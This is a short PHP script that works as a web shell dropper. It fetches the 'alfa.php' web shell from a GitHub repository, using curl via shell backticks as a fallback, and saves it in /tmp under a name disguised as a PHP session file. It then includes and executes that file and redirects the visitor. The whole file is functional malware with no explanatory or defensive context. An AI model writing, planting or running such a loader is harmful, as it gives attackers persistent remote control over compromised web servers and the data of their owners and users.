<?php
$URL = 'raw.githubusercontent.com/senada13/j7webshells/main/alfa.php';
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';

function M() {
	$FGT = @file_get_contents($GLOBALS['URL']);
	if(!$FGT) {
		echo `curl -k $(echo {$GLOBALS['URL']}) > {$GLOBALS['TMP']}`;
	} else {
		$HANDLE = fopen($GLOBALS['TMP'], 'w');
		fwrite($HANDLE, $FGT);
		fclose($HANDLE);
	}
	echo '<script>window.location="?j";</script>';
}

if(file_exists($TMP)) {
	if(filesize($TMP) === 0) {
		unlink($TMP);
		M();
	} else {
		include($TMP);
	}
} else {
	M();
}
?>
